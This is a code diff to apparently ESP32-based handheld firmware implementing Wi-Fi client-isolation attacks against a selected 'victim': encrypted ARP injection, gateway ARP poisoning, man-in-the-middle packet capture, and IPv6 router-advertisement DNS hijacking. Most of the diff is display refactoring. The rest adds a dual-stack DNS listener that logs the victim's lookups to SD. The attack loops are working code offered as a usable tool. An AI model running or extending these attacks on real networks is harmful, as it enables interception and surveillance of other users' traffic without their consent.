@@ -28,12 +28,12 @@
 #include <lwip/etharp.h>           // read the victim's reply straight from our ARP cache
 #include <lwip/netif.h>
 #include <lwip/tcpip.h>            // LOCK_TCPIP_CORE
+#include <lwip/udp.h>             // RA DNS poison: dual-stack (v4+v6) UDP-53 listener
 #include <ESP32Ping.h>            // bounce: reach the victim via the gateway at IP layer
 #include <SD.h>
 #include "sdcard_manager.h"       // portdown capture → /apps/isoscan/NNN.pcap
 #include "pcap_writer.h"          // libpcap writer (linktype 105)
 #include "wifi_sd_guard.h"        // ScopedPromiscPause — GDMA-safe SD writes
-#include <WiFiUdp.h>              // RA DNS poison: UDP-53 DNS-query listener
 #include <esp_netif.h>           // RA DNS poison: our link-local IPv6 for RDNSS
 
 extern DisplayManager displayManager;
@@ -102,19 +102,24 @@ static void isoMacStr(const uint8_t* m, char* b, int n) {
 
 // ── victim picker (over the netspy device list) ─────────────────────────────────
 #define ISO_ROWS 9
-static void isoPickDraw(int page, int sel) {
+static void isoPickChrome() {
     auto& dm = displayManager;
     isoHeader("pick a victim");
-    int devN = netspyDeviceCount();
     dm.setTextColor(0x7BEF);
     dm.setCursor(4,   outputY + LINE_HEIGHT * 2); dm.printText("#");
     dm.setCursor(26,  outputY + LINE_HEIGHT * 2); dm.printText("IP");
     dm.setCursor(122, outputY + LINE_HEIGHT * 2); dm.printText("NAME / VENDOR");
+}
+static void isoPickBody(int page, int sel) {
+    auto& dm = displayManager;
+    int devN = netspyDeviceCount();
+    int rowTop = outputY + LINE_HEIGHT * 3;
+    dm.fillRect(0, rowTop, SCREEN_WIDTH, 240 - rowTop, TFT_BLACK);   // rows + footer only
     int total = (devN + ISO_ROWS - 1) / ISO_ROWS; if (total < 1) total = 1;
     if (page >= total) page = total - 1;
     for (int r = 0; r < ISO_ROWS; r++) {
         int idx = page * ISO_ROWS + r;
-        int y = outputY + LINE_HEIGHT * (3 + r);
+        int y = rowTop + LINE_HEIGHT * r;
         if (idx >= devN) continue;
         bool s = (r == sel);
         if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
@@ -131,61 +136,78 @@ static void isoPickDraw(int page, int sel) {
     dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText(foot);
 }
 
-// Returns a netspy device index, or -1 if cancelled.
+// Returns a netspy device index, or -1 if cancelled. Chrome once; rows redrawn
+// only on page/selection change (no per-tick clearScreen = no flicker).
 static int isoPickVictim() {
     auto& dm = displayManager;
-    int page = 0, sel = 0; uint32_t lastDraw = 0;
+    int page = 0, sel = 0, lastPage = -1, lastSel = -1;
+    isoPickChrome();
     while (true) {
         char k = inputHandler.getKeyboardInput();
         TrackballEvent tb = inputHandler.getTrackballEvent();
         int devN = netspyDeviceCount();
+        int total = (devN + ISO_ROWS - 1) / ISO_ROWS; if (total < 1) total = 1;
         int pageCount = devN - page * ISO_ROWS; if (pageCount > ISO_ROWS) pageCount = ISO_ROWS;
 
         if (k == 'q' || k == 'Q') return -1;
-        else if (k == 'l' || k == 'L') { page++; sel = 0; lastDraw = 0; }
-        else if (k == 'a' || k == 'A') { if (page > 0) { page--; sel = 0; } lastDraw = 0; }
+        else if (k == 'l' || k == 'L') { if (page < total - 1) { page++; sel = 0; } }
+        else if (k == 'a' || k == 'A') { if (page > 0)         { page--; sel = 0; } }
         else if ((k == '\r' || k == '\n') && pageCount > 0) return page * ISO_ROWS + sel;
         else if (tb == TBALL_CLICK && pageCount > 0)        return page * ISO_ROWS + sel;
-        else if (tb == TBALL_DOWN) { if (sel < pageCount - 1) { sel++; lastDraw = 0; } }
-        else if (tb == TBALL_UP)   { if (sel > 0)             { sel--; lastDraw = 0; } }
+        else if (tb == TBALL_DOWN && sel < pageCount - 1) sel++;
+        else if (tb == TBALL_UP   && sel > 0)             sel--;
 
-        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-        if (!dm.isBlocked() && millis() - lastDraw >= 500) { isoPickDraw(page, sel); lastDraw = millis(); }
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) { isoPickChrome(); lastPage = -1; lastSel = -1; }
+        if (!dm.isBlocked() && (page != lastPage || sel != lastSel)) { isoPickBody(page, sel); lastPage = page; lastSel = sel; }
         vTaskDelay(pdMS_TO_TICKS(30));
     }
 }
 
 // ── attack menu (when no attack was given on the CLI) ────────────────────────────
-static void isoMenuDraw(int idx, int sel) {
+// Chrome (header + target + footer) drawn ONCE; body redrawn only when the
+// selection moves — no per-tick clearScreen, so no flicker. The selected attack's
+// one-line description is shown so each tool explains itself.
+static void isoMenuChrome(int idx) {
     auto& dm = displayManager;
     isoHeader("choose attack");
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("target:");
     const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
-    dm.setTextColor(TFT_CYAN); dm.setCursor(58, outputY + LINE_HEIGHT * 2); dm.printText(nm);
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT);  dm.printText("target:");
+    dm.setTextColor(TFT_CYAN);     dm.setCursor(58, outputY + LINE_HEIGHT); dm.printText(nm);
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
+    dm.printText("trkbl=move   ent=run   q=back");
+}
+static void isoMenuBody(int sel) {
+    auto& dm = displayManager;
+    int top = outputY + LINE_HEIGHT * 2;
+    dm.fillRect(0, top, SCREEN_WIDTH, 226 - top, TFT_BLACK);   // list + desc region only
     for (int i = 0; i < ISO_ATTACK_N; i++) {
-        int y = outputY + LINE_HEIGHT * (4 + i);
+        int y = top + LINE_HEIGHT * i;
         bool s = (i == sel);
         if (s) dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT, 0x0010);
-        dm.setCursor(10, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE);
-        dm.printText(ISO_ATTACKS[i].label);
+        dm.setCursor(6, y);  dm.setTextColor(s ? TFT_YELLOW : 0x7BEF);    dm.printText(s ? ">" : " ");
+        dm.setCursor(20, y); dm.setTextColor(s ? TFT_YELLOW : TFT_WHITE); dm.printText(ISO_ATTACKS[i].label);
+        // CLI keyword — matches auto's verdict + `is ns# <keyword>`
+        char kb[14]; snprintf(kb, sizeof(kb), "[%s]", ISO_ATTACKS[i].key);
+        dm.setCursor(234, y); dm.setTextColor(s ? 0xFFE0 : 0x6FE8); dm.printText(kb);
     }
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
-    dm.printText("trkbl=sel  ent=run  q=cancel");
+    dm.setTextColor(0x6FE8); dm.setCursor(6, top + LINE_HEIGHT * ISO_ATTACK_N + 5);
+    dm.printText(ISO_ATTACKS[sel].desc);
 }
 
 // Returns the chosen attack, or ISO_NONE if cancelled.
 static IsoAttack isoAttackMenu(int idx) {
     auto& dm = displayManager;
-    int sel = 0; uint32_t lastDraw = 0;
+    int sel = 0, lastSel = -1;
+    isoMenuChrome(idx);
     while (true) {
         char k = inputHandler.getKeyboardInput();
         TrackballEvent tb = inputHandler.getTrackballEvent();
         if (k == 'q' || k == 'Q') return ISO_NONE;
-        else if ((k == '\r' || k == '\n') || tb == TBALL_CLICK) return ISO_ATTACKS[sel].id;
-        else if (tb == TBALL_DOWN) { if (sel < ISO_ATTACK_N - 1) { sel++; lastDraw = 0; } }
-        else if (tb == TBALL_UP)   { if (sel > 0)                { sel--; lastDraw = 0; } }
-        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-        if (!dm.isBlocked() && millis() - lastDraw >= 500) { isoMenuDraw(idx, sel); lastDraw = millis(); }
+        if ((k == '\r' || k == '\n') || tb == TBALL_CLICK) return ISO_ATTACKS[sel].id;
+        if (tb == TBALL_DOWN && sel < ISO_ATTACK_N - 1) sel++;
+        if (tb == TBALL_UP   && sel > 0)                sel--;
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) { isoMenuChrome(idx); lastSel = -1; }
+        if (!dm.isBlocked() && sel != lastSel) { isoMenuBody(sel); lastSel = sel; }
         vTaskDelay(pdMS_TO_TICKS(30));
     }
 }
@@ -309,63 +331,70 @@ static void isoInjectArp(int idx) {
     uint8_t  keyid = 1;                              // GTK key id — tunable ([k] toggles 1/2)
     uint16_t seq = 0;
     uint32_t txOk = 0, txErr = 0;
-    uint32_t lastTx = 0, lastDraw = 0, lastArp = 0;
+    uint32_t lastTx = 0, lastVal = 0, lastArp = 0;
     esp_err_t lastRc = ESP_OK;
     bool arpHit = false; uint8_t arpMac[6] = { 0 };  // victim reply seen in OUR ARP cache
 
-    auto draw = [&]() {
+    // Fixed rows so only the values that change get repainted (no full-body clear
+    // = no flicker; same in-place approach as portdown/radns).
+    const int yWhat = outputY + LINE_HEIGHT * 2, yTgt = outputY + LINE_HEIGHT * 3;
+    const int yIp = outputY + LINE_HEIGHT * 4, yKey = outputY + LINE_HEIGHT * 6;
+    const int yOk = outputY + LINE_HEIGHT * 7, yErr = outputY + LINE_HEIGHT * 8;
+    const int yRes = outputY + LINE_HEIGHT * 10;
+
+    auto chrome = [&]() {                             // static parts — drawn once
         if (dm.isBlocked()) return;
         isoHeader("inject: ARP (GTK)");
-        int y = outputY + LINE_HEIGHT * 2; char b[48];
         const char* nm = netspyDeviceName(idx); if (!nm) nm = "?";
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("target");
-        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(nm); y += LINE_HEIGHT;
+        char b[48];
+        dm.setTextColor(0x6FE8);       dm.setCursor(6, yWhat); dm.printText("send encrypted ARP; wait for a reply");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yTgt);  dm.printText("target");
+        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, yTgt); dm.printText(nm);
         isoIpStr(victimIp, b, sizeof(b));
-        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
-        snprintf(b, sizeof(b), "keyid %u", keyid);
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("params");
-        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
-        snprintf(b, sizeof(b), "TX ok : %lu", (unsigned long)txOk);
-        dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
-        snprintf(b, sizeof(b), "TX err: %lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
-        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b);
-        y += LINE_HEIGHT + 4;
-        // victim reply = inject reached the target. The unicast reply is delivered
-        // to our IP stack, so we read it straight from our own ARP cache.
-        if (arpHit) {
-            dm.setTextColor(TFT_GREEN); dm.setCursor(6, y);
-            dm.printText("VICTIM REPLIED - reachable!"); y += LINE_HEIGHT;
-            snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x  (ARP cache)",
-                     arpMac[0], arpMac[1], arpMac[2], arpMac[3], arpMac[4], arpMac[5]);
-            dm.setTextColor(TFT_GREEN); dm.setCursor(6, y); dm.printText(b);
-        } else {
-            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);
-            dm.printText("no reply yet (waiting...)");
-        }
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);
-        dm.printText("[k] keyid 1/2   [q] stop");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yIp);   dm.printText("ip");
+        dm.setTextColor(TFT_WHITE);    dm.setCursor(72, yIp);  dm.printText(b);
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yKey);  dm.printText("keyid");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yOk);   dm.printText("TX ok");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yErr);  dm.printText("TX err");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);   dm.printText("[k] keyid 1/2   [q] stop");
     };
-    draw();
+    auto val = [&](int y, uint16_t col, const char* s) {   // repaint one value cell in place
+        dm.fillRect(66, y, SCREEN_WIDTH - 66, LINE_HEIGHT, TFT_BLACK);
+        dm.setTextColor(col); dm.setCursor(72, y); dm.printText(s);
+    };
+    auto values = [&]() {
+        if (dm.isBlocked()) return;
+        char b[48];
+        snprintf(b, sizeof(b), "%u", keyid);                val(yKey, TFT_YELLOW, b);
+        snprintf(b, sizeof(b), "%lu", (unsigned long)txOk); val(yOk,  TFT_GREEN,  b);
+        snprintf(b, sizeof(b), "%lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
+        val(yErr, txErr ? TFT_RED : TFT_DARKGREY, b);
+        dm.fillRect(0, yRes, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
+        if (arpHit) {
+            snprintf(b, sizeof(b), "REACHED  %02x:%02x:%02x:%02x:%02x:%02x",
+                     arpMac[0], arpMac[1], arpMac[2], arpMac[3], arpMac[4], arpMac[5]);
+            dm.setTextColor(TFT_GREEN); dm.setCursor(6, yRes); dm.printText(b);
+        } else {
+            dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yRes); dm.printText("waiting for the victim to reply...");
+        }
+    };
+    chrome(); values();
 
     while (true) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
-        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }
+        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; if (!dm.isBlocked()) values(); }
 
         if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
             lastTx = millis();
             lastRc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, myIp, victimIp);
             if (lastRc == ESP_OK) txOk++; else txErr++;
             pn++;
-            lastDraw = 0;
         }
 
         // Resolve the victim via our own IP stack (netdiscover's proven pattern:
         // etharp_request primes a pending entry, then etharp_find_addr reads it
-        // once a reply completes it). A hit = the victim is reachable at the IP
-        // layer. On an ISOLATED net a normal ARP can't reach it, so a hit means
-        // our injected broadcast is what got through; on a NON-isolated net the
-        // stack can resolve it anyway (so it just confirms the detector works).
+        // once a reply completes it). A hit = the victim is reachable at the IP layer.
         if (!arpHit && netif_default && millis() - lastArp >= 500) {
             lastArp = millis();
             ip4_addr_t vt;
@@ -376,11 +405,11 @@ static void isoInjectArp(int idx) {
             etharp_request(netif_default, &vt);
             s8_t hit = etharp_find_addr(netif_default, &vt, &er, &ir);
             UNLOCK_TCPIP_CORE();
-            if (hit >= 0 && er) { arpHit = true; memcpy(arpMac, er->addr, 6); lastDraw = 0; }
+            if (hit >= 0 && er) { arpHit = true; memcpy(arpMac, er->addr, 6); if (!dm.isBlocked()) values(); }
         }
 
-        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-        if (!dm.isBlocked() && millis() - lastDraw >= 300) { draw(); lastDraw = millis(); }
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) { chrome(); values(); }
+        if (!dm.isBlocked() && millis() - lastVal >= 500) { values(); lastVal = millis(); }
         vTaskDelay(pdMS_TO_TICKS(5));
     }
     dm.clearScreen(); dm.printCommandScreen();
@@ -410,40 +439,51 @@ static void isoGwPoison(int idx) {
     if (!gwIp) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return; }
 
     uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
-    uint32_t txOk = 0, txErr = 0, lastTx = 0, lastDraw = 0; esp_err_t lastRc = ESP_OK;
+    uint32_t txOk = 0, txErr = 0, lastTx = 0, lastVal = 0; esp_err_t lastRc = ESP_OK;
 
-    auto draw = [&]() {
+    const int yWhat = outputY + LINE_HEIGHT * 2, yGw = outputY + LINE_HEIGHT * 3;
+    const int yVic = outputY + LINE_HEIGHT * 4, yTx = outputY + LINE_HEIGHT * 6;
+    const int yErr = outputY + LINE_HEIGHT * 7, yHint = outputY + LINE_HEIGHT * 9;
+
+    auto chrome = [&]() {                             // static parts — drawn once
         if (dm.isBlocked()) return;
         isoHeader("gateway poison");
-        int y = outputY + LINE_HEIGHT * 2; char b[48];
+        char b[48];
+        dm.setTextColor(0x6FE8);       dm.setCursor(6, yWhat); dm.printText("tell victim WE are its gateway");
         isoIpStr(gwIp, b, sizeof(b));
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("gateway");
-        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT;
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yGw);  dm.printText("gateway");
+        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, yGw); dm.printText(b);
         isoIpStr(victimIp, b, sizeof(b));
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y);  dm.printText("victim");
-        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, y); dm.printText(b); y += LINE_HEIGHT + 4;
-        snprintf(b, sizeof(b), "keyid %u   TX ok %lu", keyid, (unsigned long)txOk);
-        dm.setTextColor(TFT_GREEN);    dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT;
-        snprintf(b, sizeof(b), "TX err %lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
-        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(6, y); dm.printText(b); y += LINE_HEIGHT + 4;
-        dm.setTextColor(0x7BEF); dm.setCursor(6, y); dm.printText("victim gateway -> this device."); y += LINE_HEIGHT;
-        dm.setTextColor(0x7BEF); dm.setCursor(6, y); dm.printText("watch its internet: drop = works.");
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid 1/2   [q] stop");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yVic);  dm.printText("victim");
+        dm.setTextColor(TFT_CYAN);     dm.setCursor(72, yVic); dm.printText(b);
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yTx);  dm.printText("TX ok");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yErr); dm.printText("TX err");
+        dm.setTextColor(0x7BEF);       dm.setCursor(6, yHint); dm.printText("watch victim net: stalls = holding");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);  dm.printText("[k] keyid 1/2   [q] stop");
     };
-    draw();
+    auto values = [&]() {                             // repaint only the counters, in place
+        if (dm.isBlocked()) return;
+        char b[48];
+        snprintf(b, sizeof(b), "%lu   (keyid %u)", (unsigned long)txOk, keyid);
+        dm.fillRect(66, yTx, SCREEN_WIDTH - 66, LINE_HEIGHT, TFT_BLACK);
+        dm.setTextColor(TFT_GREEN); dm.setCursor(72, yTx); dm.printText(b);
+        snprintf(b, sizeof(b), "%lu (rc=%d)", (unsigned long)txErr, (int)lastRc);
+        dm.fillRect(66, yErr, SCREEN_WIDTH - 66, LINE_HEIGHT, TFT_BLACK);
+        dm.setTextColor(txErr ? TFT_RED : TFT_DARKGREY); dm.setCursor(72, yErr); dm.printText(b);
+    };
+    chrome(); values();
     while (true) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
-        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }
+        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; if (!dm.isBlocked()) values(); }
         if (millis() - lastTx >= 20) {                 // ~50 fps (enough to hold a poison on an L2 AP)
             lastTx = millis();
             lastRc = isoTxGtkArp(gtk, bssid, src, keyid, pn, seq++, gwIp, victimIp);  // sender IP = gateway
             if (lastRc == ESP_OK) txOk++; else txErr++;
             pn++;
-            lastDraw = 0;
         }
-        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-        if (!dm.isBlocked() && millis() - lastDraw >= 300) { draw(); lastDraw = millis(); }
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) { chrome(); values(); }
+        if (!dm.isBlocked() && millis() - lastVal >= 500) { values(); lastVal = millis(); }
         vTaskDelay(pdMS_TO_TICKS(5));
     }
     dm.clearScreen(); dm.printCommandScreen();
@@ -595,10 +635,11 @@ static void isoPortDown(int idx) {
 
     char b[56];
     isoMacStr(vic, b, sizeof(b));
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("victim");
-    dm.setTextColor(TFT_CYAN);     dm.setCursor(56, outputY + LINE_HEIGHT * 2); dm.printText(b);
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("file");
-    dm.setTextColor(0x6FE8);       dm.setCursor(56, outputY + LINE_HEIGHT * 3); dm.printText(path);
+    dm.setTextColor(0x6FE8);       dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("save victim's frames to SD (open in Wireshark)");
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("victim");
+    dm.setTextColor(TFT_CYAN);     dm.setCursor(56, outputY + LINE_HEIGHT * 3); dm.printText(b);
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 4); dm.printText("file");
+    dm.setTextColor(0x6FE8);       dm.setCursor(56, outputY + LINE_HEIGHT * 4); dm.printText(path);
 
     // Arm capture (portdown does not do redirect classification).
     s_capHead = s_capTail = 0; s_capSeen = s_capDropped = 0;
@@ -691,9 +732,9 @@ static void isoMitm(int idx) {
     }
 
     char b[56];
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2); dm.printText("file");
-    dm.setTextColor(0x6FE8);       dm.setCursor(56, outputY + LINE_HEIGHT * 2);
-    dm.printText(cap ? path : "(no SD - live count only)");
+    dm.setTextColor(0x6FE8); dm.setCursor(6, outputY + LINE_HEIGHT * 2);
+    dm.printText(cap ? "poison + capture; is it holding? see verdict"
+                     : "poison + capture (no SD - live count only)");
 
     // Arm capture with redirect detection.
     s_capHead = s_capTail = 0; s_capSeen = s_capDropped = s_capRedir = s_capArpAck = s_capCand = 0;
@@ -752,7 +793,7 @@ static void isoMitm(int idx) {
         }
 
         if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
-        if (!dm.isBlocked() && millis() - lastDraw >= 400) {
+        if (!dm.isBlocked() && millis() - lastDraw >= 600) {
             int y = outputY + LINE_HEIGHT * 3;
             snprintf(b, sizeof(b), "poison TX: %lu (keyid %u)", (unsigned long)txOk, keyid);
             dm.fillRect(0, y, SCREEN_WIDTH, LINE_HEIGHT * 6, TFT_BLACK);
@@ -1024,6 +1065,33 @@ static bool isoDnsName(const uint8_t* b, int len, char* out, int outsz) {
     return on > 0;
 }
 
+// The RA hands the victim our IPv6 link-local as its DNS server, so queries arrive
+// over IPv6 — a plain WiFiUDP binds IPv4-only and misses them. A raw lwip pcb bound
+// to IPADDR_TYPE_ANY catches both. The recv cb runs in the tcpip thread, so it only
+// parses + rings the query; the main loop drains it (SD log + on-screen list).
+struct IsoDnsQ { char dom[48]; char src[46]; };
+static volatile IsoDnsQ s_dnsRing[8];
+static volatile uint8_t s_dnsHead = 0, s_dnsTail = 0;
+
+static void isoDnsRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p,
+                       const ip_addr_t* addr, u16_t port) {
+    (void)arg; (void)pcb; (void)port;
+    if (!p) return;
+    uint8_t buf[256];
+    int n = (int)pbuf_copy_partial(p, buf, sizeof(buf), 0);
+    char dom[48];
+    if (n > 0 && addr && isoDnsName(buf, n, dom, sizeof(dom))) {
+        uint8_t nx = (uint8_t)((s_dnsHead + 1) % 8);
+        if (nx != s_dnsTail) {
+            strncpy((char*)s_dnsRing[s_dnsHead].dom, dom, sizeof(s_dnsRing[0].dom) - 1);
+            s_dnsRing[s_dnsHead].dom[sizeof(s_dnsRing[0].dom) - 1] = '\0';
+            ipaddr_ntoa_r(addr, (char*)s_dnsRing[s_dnsHead].src, sizeof(s_dnsRing[0].src));
+            s_dnsHead = nx;
+        }
+    }
+    pbuf_free(p);
+}
+
 static void isoRaDns(int idx) {
     auto& dm = displayManager;
     (void)idx;                                       // RA is multicast — hits all clients
@@ -1062,17 +1130,38 @@ static void isoRaDns(int idx) {
         log = SD.open(path, FILE_WRITE);
         if (log) log.println("time_ms,src_ip,query");
     }
-    WiFiUDP udp; udp.begin(53);
+    // Dual-stack UDP:53 listener (IPv6 + IPv4) — the RA points the victim at us
+    // over IPv6, so we must accept v6 queries, not just v4.
+    s_dnsHead = s_dnsTail = 0;
+    struct udp_pcb* dpcb = nullptr;
+    LOCK_TCPIP_CORE();
+    dpcb = udp_new_ip_type(IPADDR_TYPE_ANY);
+    if (dpcb) { udp_bind(dpcb, IP_ANY_TYPE, 53); udp_recv(dpcb, isoDnsRecv, nullptr); }
+    UNLOCK_TCPIP_CORE();
 
+    const int RA_HIST = 5;
     uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
-    uint32_t raSent = 0, dnsRx = 0, lastRA = 0, lastDraw = 0;
-    char lastQ[40] = "";
+    uint32_t raSent = 0, dnsRx = 0, lastRA = 0;
+    char hist[RA_HIST][44]; int histN = 0; bool histDirty = true;   // live query list
+    uint32_t shownRA = 0xffffffff, shownDns = 0xffffffff; uint8_t shownKey = 0;
     char llShort[24]; snprintf(llShort, sizeof(llShort), "fe80::..%02x%02x", ll[14], ll[15]);
+
+    auto chrome = [&]() {                             // static parts — drawn once
+        if (dm.isBlocked()) return;
+        int top = outputY + LINE_HEIGHT * 2;
+        dm.fillRect(0, top, SCREEN_WIDTH, 240 - top, TFT_BLACK);
+        dm.setTextColor(0x6FE8);       dm.setCursor(6, top);                       dm.printText("make victim use us as DNS; log its lookups");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("our DNS");
+        dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, outputY + LINE_HEIGHT * 3); dm.printText(llShort);
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 6); dm.printText("victim is reaching:");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);                       dm.printText("[k] keyid   [q] stop");
+    };
+    chrome();
 
     while (true) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
-        if (k == 'k' || k == 'K') { keyid = (keyid == 1) ? 2 : 1; lastDraw = 0; }
+        if (k == 'k' || k == 'K') keyid = (keyid == 1) ? 2 : 1;
 
         if (millis() - lastRA >= 2000) {             // RAs are periodic — 2s is plenty
             lastRA = millis();
@@ -1088,45 +1177,53 @@ static void isoRaDns(int idx) {
                 if (esp_wifi_80211_tx(WIFI_IF_STA, frame, 24 + elen, false) == ESP_OK) raSent++;
                 pn++;
             }
-            lastDraw = 0;
         }
 
-        int n = udp.parsePacket();
-        if (n > 0) {
-            uint8_t buf[256]; int r = udp.read(buf, sizeof(buf));
-            char dom[40];
-            if (r > 0 && isoDnsName(buf, r, dom, sizeof(dom))) {
-                dnsRx++; strncpy(lastQ, dom, sizeof(lastQ) - 1); lastQ[sizeof(lastQ) - 1] = '\0';
-                if (log) {
-                    IPAddress ri = udp.remoteIP();
-                    char line[80]; snprintf(line, sizeof(line), "%lu,%u.%u.%u.%u,%s",
-                        (unsigned long)millis(), ri[0], ri[1], ri[2], ri[3], dom);
-                    log.println(line); log.flush();
+        // Drain DNS queries the lwip cb captured (v4 or v6) → list + SD log.
+        while (s_dnsTail != s_dnsHead) {
+            IsoDnsQ q;
+            memcpy(&q, (const void*)&s_dnsRing[s_dnsTail], sizeof(q));
+            s_dnsTail = (uint8_t)((s_dnsTail + 1) % 8);
+            dnsRx++;
+            if (histN < RA_HIST) histN++;
+            else for (int i = 1; i < RA_HIST; i++) memcpy(hist[i - 1], hist[i], sizeof(hist[0]));
+            strncpy(hist[histN - 1], q.dom, sizeof(hist[0]) - 1); hist[histN - 1][sizeof(hist[0]) - 1] = '\0';
+            histDirty = true;
+            if (log) {
+                char line[100]; snprintf(line, sizeof(line), "%lu,%s,%s",
+                    (unsigned long)millis(), q.src, q.dom);
+                log.println(line); log.flush();
+            }
+        }
+
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
+            chrome(); shownRA = shownDns = 0xffffffff; histDirty = true;
+        }
+        if (!dm.isBlocked()) {
+            // counter line — repaint only when a value changed (no flicker)
+            if (raSent != shownRA || dnsRx != shownDns || keyid != shownKey) {
+                char b[56]; int yc = outputY + LINE_HEIGHT * 4;
+                dm.fillRect(0, yc, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
+                snprintf(b, sizeof(b), "RA sent %lu (k%u)   DNS rcvd %lu",
+                         (unsigned long)raSent, keyid, (unsigned long)dnsRx);
+                dm.setTextColor(dnsRx ? TFT_GREEN : TFT_DARKGREY); dm.setCursor(6, yc); dm.printText(b);
+                shownRA = raSent; shownDns = dnsRx; shownKey = keyid;
+            }
+            // live query list — repaint only when a new query arrived
+            if (histDirty) {
+                int yl = outputY + LINE_HEIGHT * 7;
+                dm.fillRect(0, yl, SCREEN_WIDTH, 228 - yl, TFT_BLACK);
+                for (int i = 0; i < histN; i++) {
+                    dm.setTextColor(TFT_CYAN); dm.setCursor(12, yl + LINE_HEIGHT * i); dm.printText(hist[i]);
                 }
-                lastDraw = 0;
+                if (!histN) { dm.setTextColor(TFT_DARKGREY); dm.setCursor(12, yl); dm.printText("(none yet)"); }
+                histDirty = false;
             }
-        }
-
-        if (LockScreenManager::getInstance().consumeJustUnlocked()) lastDraw = 0;
